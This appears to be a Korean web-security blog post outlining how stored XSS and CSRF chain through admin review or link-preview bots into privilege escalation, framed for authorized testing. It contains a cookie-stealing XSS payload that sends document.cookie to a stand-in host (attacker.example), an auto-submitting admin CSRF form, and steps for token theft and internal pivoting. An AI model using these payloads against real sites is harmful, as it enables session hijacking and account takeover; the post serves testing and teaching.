---
title: "관리자 봇 시나리오 체이닝"
date: 2026-10-15 09:00:00 +0900
categories: [Web Security, Scenario]
tags: [xss, csrf, admin-bot, chaining, web]
description: "신고·검토·방문 봇(관리자 세션)을 거쳐 저장형 XSS·CSRF를 터뜨리는 체인을 진단 시나리오로 보는 개념과, 트리거·탈취 구문을 정리합니다."
mermaid: true
---

> 많은 서비스에 "신고를 검토하는 봇"이나 "링크를 미리 보는 봇"이 있고, 그 봇은 **관리자/다른 사용자 세션**으로 내 입력을 연다. 단독으로는 약한 저장형 XSS·CSRF가 이 봇을 거치면 고권한 탈취로 이어진다.

## 개념

트리거(봇이 내 콘텐츠를 연다) + 페이로드(그 컨텍스트에서 실행) + 탈취(쿠키·CSRF로 권한 행사)의 체인이다. 봇은 신고 처리, 문의 검토, 링크 미리보기, 주문 확인 화면 등에서 **공격자가 심은 데이터를 피해자 권한으로 렌더링**한다.

```
공격자 입력(신고 내용에 XSS) → 관리자 봇이 신고함 열람 → 관리자 컨텍스트에서 실행 → 관리자 토큰/기능 탈취
```

## 공격·우회 구문

허가된 범위에서, 무해한 증거(OAST·본인 테스트 관리 계정)로만.

### 트리거 찾기

```
내 입력이 '다른 권한 사용자'에게 렌더링되는 지점:
  신고/문의/리뷰/댓글/프로필/주문메모/지원 티켓
봇이 링크를 여는 기능: URL 미리보기·링크 검증·스크린샷
```

### 페이로드 (봇 컨텍스트에서 실행)

```
저장형 XSS: <img src=x onerror="fetch('//attacker.example/?c='+document.cookie)">
관리자 CSRF: 봇/관리자 세션으로 상태변경 요청 자동 발사
  <form action=/admin/grant method=POST> ... </form> + 자동 제출
관리자 전용 API 를 XSS로 호출(토큰이 쿠키면 자동 첨부)
```

### 탈취·권한 상승

```
관리자 쿠키·CSRF 토큰 수집 → 관리 기능 수행(계정 승격·설정 변경)
봇 환경 정보(내부 URL·헤더) 수집 → 내부망 피벗
HttpOnly 로 쿠키 못 읽으면: XSS로 관리 API 직접 호출(세션 라이딩)
```

### 확인 요령

```
입력이 저장돼 '언제·누구에게' 렌더링되는지 흐름을 그림
봇 방문 여부: OAST 콜백으로 확인(봇이 내 서버에 접속하는지)
HttpOnly·CSP·SameSite 가 체인의 어느 고리를 끊는지
```

## 참고 자료

- [OWASP Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [CWE-352: Cross-Site Request Forgery](https://cwe.mitre.org/data/definitions/352.html)
